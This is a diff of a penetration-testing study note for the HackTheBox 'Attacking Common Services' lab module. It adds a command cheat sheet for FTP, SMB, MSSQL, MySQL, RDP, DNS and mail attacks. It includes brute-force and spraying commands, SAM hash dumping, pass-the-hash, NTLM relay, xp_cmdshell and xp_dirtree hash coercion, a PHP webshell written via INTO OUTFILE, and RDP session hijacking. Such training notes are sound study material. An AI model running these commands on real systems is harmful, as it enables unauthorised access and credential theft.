@@ -2,9 +2,9 @@
 
 #AttackingCommonServices #FTP #SMB #MSSQL #RDP #DNS #SMTP #POP3 #IMAP #CoreFTP #CVE202222836 #xpDirtree #UNCInjection #NetNTLMv2 #sqlcmd #MSSQLImpersonation #LinkedServer #subbrute #HydraFTP #HydraPOP3 #HydraSMTP #enum4linux #smbclientNull #HTBSupplementary
 
-**HTB Attacking Common Services module** — supplementary reference for service-specific attack techniques not covered by existing vault notes. Tier 2, Medium difficulty. The existing vault covers enumeration of all these services (Footprinting.md FP.1-FP.8), Hydra for SSH/RDP/HTTP (Password Attacks.md 16.1), xp_cmdshell basics (FP.8), and PtH over RDP (PA.18). This note documents the attack-specific techniques that aren't there.
+**HTB Attacking Common Services module**, supplementary reference for service-specific attack techniques not covered by existing vault notes. Tier 2, Medium difficulty. The existing vault covers enumeration of all these services (Footprinting.md FP.1-FP.8), Hydra for SSH/RDP/HTTP (Password Attacks.md 16.1), xp_cmdshell basics (FP.8), and PtH over RDP (PA.18). This note documents the attack-specific techniques that aren't there.
 
-> 🔁 Cross-refs: [[Footprinting#FP.8. MSSQL|FP.8 MSSQL impacket-mssqlclient + xp_cmdshell]], [[Footprinting#FP.5. SMTP|FP.5 smtp-user-enum]], [[Footprinting#FP.6. IMAP / POP3|FP.6 IMAP openssl session]], [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3 hashcat -m 5600]], [[Password Attacks (HTB Supplementary)#PA.18. Pass the Hash — Deep Dive|PA.18 xfreerdp /pth:]], [[Password Attacks (HTB Supplementary)#PA.5. MSF smb_login|PA.5 smb_login auxiliary]]
+> 🔁 Cross-refs: [[Footprinting#FP.8. MSSQL|FP.8 MSSQL impacket-mssqlclient + xp_cmdshell]], [[Footprinting#FP.5. SMTP|FP.5 smtp-user-enum]], [[Footprinting#FP.6. IMAP / POP3|FP.6 IMAP openssl session]], [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3 hashcat -m 5600]], [[Password Attacks (HTB Supplementary)#PA.18. Pass the Hash. Deep Dive|PA.18 xfreerdp /pth:]], [[Password Attacks (HTB Supplementary)#PA.5. MSF smb_login|PA.5 smb_login auxiliary]]
 
 ---
 
@@ -66,11 +66,11 @@ curl -w "\n" "http://TARGET_IP/FILENAME.php?c=whoami"
 curl -w "\n" "http://TARGET_IP/FILENAME.php?c=dir%20C:\\users\\administrator"
 ```
 
-> 🔧 Technique: the `--path-as-is` flag to curl is critical. Without it, curl normalises the `../` sequences and the path traversal fails. The flag preserves the raw path string exactly as written. Also use the CoreFTP HTTPS port (443 or whatever was found) for the PUT, then HTTP (80) for the GET to the webshell — the two services are separate daemons.
+> 🔧 Technique: the `--path-as-is` flag to curl is critical. Without it, curl normalises the `../` sequences and the path traversal fails. The flag preserves the raw path string exactly as written. Also use the CoreFTP HTTPS port (443 or whatever was found) for the PUT, then HTTP (80) for the GET to the webshell, the two services are separate daemons.
 
-> 🔧 Technique: the traversal depth (`/../../../../../../`) must reach the filesystem root and then back into `xampp\htdocs`. Count the depth of the CoreFTP web root from C:\ and add enough `../` to overshoot. More segments than needed is fine — the OS stops at the root.
+> 🔧 Technique: the traversal depth (`/../../../../../../`) must reach the filesystem root and then back into `xampp\htdocs`. Count the depth of the CoreFTP web root from C:\ and add enough `../` to overshoot. More segments than needed is fine, the OS stops at the root.
 
-> 🔍 Worth remembering generally: CoreFTP's HTTP server is a separate daemon running on port 443 that allows HTTPS file access to FTP shares. CVE-2022-22836 affects the PUT handler of this HTTP component, not the FTP protocol itself. The FTP credentials authenticate the PUT request — so you need FTP access first, then exploit the HTTP component.
+> 🔍 Worth remembering generally: CoreFTP's HTTP server is a separate daemon running on port 443 that allows HTTPS file access to FTP shares. CVE-2022-22836 affects the PUT handler of this HTTP component, not the FTP protocol itself. The FTP credentials authenticate the PUT request, so you need FTP access first, then exploit the HTTP component.
 
 > 🔁 Similar to: [[Common Web Application Attacks#13.1.3. Path Traversal|13.1.3 path traversal]] and [[Common Web Application Attacks#13.3. File Inclusion|13.3 file inclusion]]. Same traversal concept at the FTP-server level rather than web-application level.
 
@@ -129,7 +129,7 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
 > 🔧 Technique: this only works when the MSSQL server can reach your Kali machine over SMB (port 445). If there's a firewall between them, the UNC auth attempt is silently dropped. Confirm connectivity with `xp_cmdshell 'ping -n 1 KALI_IP'` first if you have cmdshell access, or check the smbserver output for any connection attempt (even a rejected one shows the target tried to reach you).
 
-> 🔁 Similar to: [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3]] captures NetNTLMv2 via Responder (LLMNR/NBT-NS poisoning). This method coerces the same auth through the database — no network broadcast needed. Same hash format, same hashcat mode 5600.
+> 🔁 Similar to: [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3]] captures NetNTLMv2 via Responder (LLMNR/NBT-NS poisoning). This method coerces the same auth through the database, no network broadcast needed. Same hash format, same hashcat mode 5600.
 
 #### Tags: #MSSQL #xpDirtree #UNCInjection #NetNTLMv2 #impacketSmbserver #HashCapture #NetNTLMv2
 
@@ -157,7 +157,7 @@ sqlcmd -S TARGET_IP\INSTANCENAME -U username
 sqlcmd -S WIN-HARD       # connects to local MSSQL instance using current Windows session
 ```
 
-**Interactive session prompts** — sqlcmd doesn't use a `>` shell prompt; it uses line numbers:
+**Interactive session prompts**, sqlcmd doesn't use a `>` shell prompt; it uses line numbers:
 ```sql
 1> SELECT name FROM sys.databases
 2> go
@@ -258,9 +258,9 @@ EXEC xp_cmdshell 'whoami'
 go
 ```
 
-> 🔍 Worth remembering generally: `sys.server_permissions` with `permission_name = 'IMPERSONATE'` is the definitive query for this — not all MSSQL references document it clearly. The `grantor_principal_id` links to who **granted** the permission (the account that allowed impersonation), which is why you join to `sys.server_principals` on `grantor_principal_id`, not `grantee_principal_id`. Run this query on every MSSQL foothold before reaching for other privesc paths.
+> 🔍 Worth remembering generally: `sys.server_permissions` with `permission_name = 'IMPERSONATE'` is the definitive query for this, not all MSSQL references document it clearly. The `grantor_principal_id` links to who **granted** the permission (the account that allowed impersonation), which is why you join to `sys.server_principals` on `grantor_principal_id`, not `grantee_principal_id`. Run this query on every MSSQL foothold before reaching for other privesc paths.
 
-> 🔧 Technique: impersonation only works for server-level logins, not database users. If your account is a database user (not a server login), the `EXECUTE AS LOGIN` syntax won't work — you'd need `EXECUTE AS USER` instead. `sys.server_permissions` shows server-level grants.
+> 🔧 Technique: impersonation only works for server-level logins, not database users. If your account is a database user (not a server login), the `EXECUTE AS LOGIN` syntax won't work, you'd need `EXECUTE AS USER` instead. `sys.server_permissions` shows server-level grants.
 
 #### Tags: #MSSQL #Impersonation #ExecuteAsLogin #PrivilegeEscalation #sysadmin #sys.server_permissions
 
@@ -384,7 +384,7 @@ dig axfr hr.inlanefreight.htb @TARGET_IP | grep "TXT"
 # → hr.inlanefreight.htb.  604800  IN  TXT  "HTB{LUIHNFAS2871SJK1259991}"
 ```
 
-> 🔍 Worth remembering generally: subbrute differs from tools like `gobuster dns` in that it uses configurable resolvers — so you point it at the target nameserver. This is important when the target runs split-horizon DNS (internal records only visible via the internal NS, not through 8.8.8.8). In those cases, public resolvers return NXDOMAIN for everything even though subdomains exist internally.
+> 🔍 Worth remembering generally: subbrute differs from tools like `gobuster dns` in that it uses configurable resolvers, so you point it at the target nameserver. This is important when the target runs split-horizon DNS (internal records only visible via the internal NS, not through 8.8.8.8). In those cases, public resolvers return NXDOMAIN for everything even though subdomains exist internally.
 
 > 🔁 Similar to: [[Information Gathering#6.4.1. DNS Enumeration|6.4.1 DNS enumeration]] uses dnsenum and dig for zone transfers. subbrute adds the brute-force step for subdomain discovery before the transfer.
 
@@ -518,7 +518,7 @@ smb: \> exit
 
 > 🔧 Technique: `prompt` + `mget *` is the pattern for grabbing everything from a directory without confirming each file. Always turn off prompt before `mget` on a large directory or it'll ask Y/N for every file.
 
-> 🔁 Similar to: [[Footprinting#FP.2. SMB|FP.2]] covers rpcclient null session for domain/user enumeration. smbclient null session is for share *access* — actually reading files — which rpcclient can't do.
+> 🔁 Similar to: [[Footprinting#FP.2. SMB|FP.2]] covers rpcclient null session for domain/user enumeration. smbclient null session is for share *access*, actually reading files, which rpcclient can't do.
 
 #### Tags: #SMB #enum4linux #smbclientNull #NullSession #ShareEnum #mget #prompt
 
@@ -539,7 +539,7 @@ hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP -u -t 1
 # Much slower (74 tries/min vs normal 1000+) but avoids 550 throttle errors
 ```
 
-> 🔍 Worth remembering generally: most Hydra brute forces fail silently when the server is throttling — Hydra just sees a bad response and marks the attempt as failed without telling you it's being rate-limited. If Hydra finishes quickly with no valid result on a service that should be vulnerable, try adding `-t 1` (or `-t 4`) and re-running. The slowdown is often the difference between getting a result and getting nothing.
+> 🔍 Worth remembering generally: most Hydra brute forces fail silently when the server is throttling. Hydra just sees a bad response and marks the attempt as failed without telling you it's being rate-limited. If Hydra finishes quickly with no valid result on a service that should be vulnerable, try adding `-t 1` (or `-t 4`) and re-running. The slowdown is often the difference between getting a result and getting nothing.
 
 #### Tags: #Hydra #FTP #ThreadThrottle #RateLimit #-t1 #BruteForce
 
@@ -756,7 +756,7 @@ go
 
 - [x] CS.1. CoreFTP 725 Directory Traversal (CVE-2022-22836) via curl PUT
 - [x] CS.2. MSSQL UNC Path Injection (xp_dirtree + impacket-smbserver → NetNTLMv2 capture)
-- [x] CS.3. sqlcmd — Linux MSSQL client syntax
+- [x] CS.3. sqlcmd. Linux MSSQL client syntax
 - [x] CS.4. MSSQL database/table enumeration (INFORMATION_SCHEMA.TABLES pattern)
 - [x] CS.5. MSSQL Impersonation (sys.server_permissions query + EXECUTE AS LOGIN + is_srvrolemember)
 - [x] CS.6. MSSQL Linked Server Attacks (sysservers + EXECUTE...AT + xp_cmdshell remote + nested escaping)
@@ -779,3 +779,113 @@ go
 - **[Querier](https://0xdf.gitlab.io/2019/06/22/htb-querier.html)** (HTB, Windows, Medium): MSSQL xp_dirtree hash coercion → crack NetNTLMv2 → return to MSSQL as higher privilege. Direct hands-on example of CS.2 (UNC path injection via xp_dirtree).
 - **[Monteverde](https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html)** (HTB, Windows, Medium): SMB password spray → SMB file access → credential discovery. Adjacent workflow to CS.9 + CS.13 (null session enumeration → password lists → SMB spray).
 - **[Archetype](https://www.hackthebox.com/machines/archetype)** (HTB, Windows, Very Easy/Starting Point): MSSQL hash theft via xp_dirtree + Responder → impacket-psexec. The canonical walkthrough of CS.2 technique.
+
+
+---
+
+## HTB Module Quick Reference
+
+Commands formatted for use with the [[Pre-Engagement Kali Setup]] variable block.
+
+```bash
+# ============================================================
+# FTP
+# ============================================================
+ftp $BoxIP                          # interactive FTP client
+nc -v $BoxIP 21                     # raw banner grab
+# Anonymous login test:
+ftp $BoxIP   # user: anonymous, pass: (blank or email)
+
+# Brute-force FTP credentials
+hydra -l $Username -P /usr/share/wordlists/rockyou.txt ftp://$BoxIP
+
+# ============================================================
+# SMB
+# ============================================================
+# Null session — list shares without credentials
+smbclient -N -L //$BoxIP
+
+# Authenticated share listing
+smbclient -U $Username //$BoxIP/share -p $Password
+
+# smbmap — enumerate shares + permissions
+smbmap -H $BoxIP
+smbmap -u $Username -p $Password -d $Domain -H $BoxIP
+smbmap -H $BoxIP -r notes                                    # browse a share
+smbmap -H $BoxIP --download "notes\note.txt"                 # download file
+smbmap -H $BoxIP --upload test.txt "notes\test.txt"          # upload file
+
+# enum4linux-ng — automated null session enumeration
+./enum4linux-ng.py $BoxIP -A -C
+
+# CrackMapExec — spray, exec, dump
+crackmapexec smb $BoxIP -u $Username -p $Password             # credential test
+crackmapexec smb $BoxIP -u /tmp/userlist.txt -p 'Company01!'  # password spray
+crackmapexec smb $BoxIP -u $Username -p $Password -x 'whoami' --exec-method smbexec
+crackmapexec smb $BoxIP -u $Username -p $Password --sam       # dump SAM hashes
+crackmapexec smb $BoxIP -u $Username -H $NThash               # Pass-the-Hash
+
+# PSExec / NTLM relay
+impacket-psexec $Domain/$Username:$Password@$BoxIP
+impacket-ntlmrelayx --no-http-server -smb2support -t $BoxIP   # relay captured auth
+
+# ============================================================
+# SQL DATABASES
+# ============================================================
+# MySQL connect
+mysql -u $Username -p$Password -h $BoxIP
+
+# MSSQL connect (Windows auth)
+sqsh -S $BoxIP -U $Domain\\$Username -P "$Password" -h
+impacket-mssqlclient $Domain/$Username:$Password@$BoxIP -windows-auth
+
+# MSSQL: enable and use xp_cmdshell
+sqlcmd> EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
+sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+sqlcmd> xp_cmdshell 'whoami'
+
+# MSSQL: hash coercion via xp_dirtree
+sqlcmd> EXEC master..xp_dirtree '\\$LocalIP\share\'   # → Responder catches the hash
+
+# MSSQL: read local file
+sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+
+# MySQL: write webshell
+mysql> SELECT "<?php echo shell_exec(\$_GET['c']);?>" INTO OUTFILE '/var/www/html/shell.php';
+mysql> SHOW VARIABLES LIKE "secure_file_priv";   # check writable dirs first
+
+# ============================================================
+# RDP
+# ============================================================
+# Password spray
+crowbar -b rdp -s $BoxIP/32 -U users.txt -c 'password123'
+hydra -L users.txt -p 'password123' $BoxIP rdp
+
+# Connect
+xfreerdp /v:$BoxIP /u:$Username /p:$Password /dynamic-resolution +clipboard
+xfreerdp /v:$BoxIP /u:$Username /pth:$NThash /dynamic-resolution +clipboard   # PtH
+
+# Session hijack (no password — requires SYSTEM)
+tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
+
+# Enable Restricted Admin Mode (required for xfreerdp /pth)
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+# ============================================================
+# DNS
+# ============================================================
+dig AXFR @ns1.$BoxName $Domain               # zone transfer attempt
+host -t MX $Domain                           # find mail servers
+subfinder -d $Domain -v                      # subdomain brute-force
+
+# ============================================================
+# EMAIL (SMTP / POP3)
+# ============================================================
+telnet $BoxIP 25                             # raw SMTP banner
+smtp-user-enum -M RCPT -U users.txt -D $Domain -t $BoxIP   # user enum
+hydra -L users.txt -p 'Company01!' -f $BoxIP pop3           # POP3 brute-force
+
+# Open relay test
+swaks --from notifications@$Domain --to employees@$Domain \
+  --header 'Subject: Test' --body 'Message' --server $BoxIP
+```
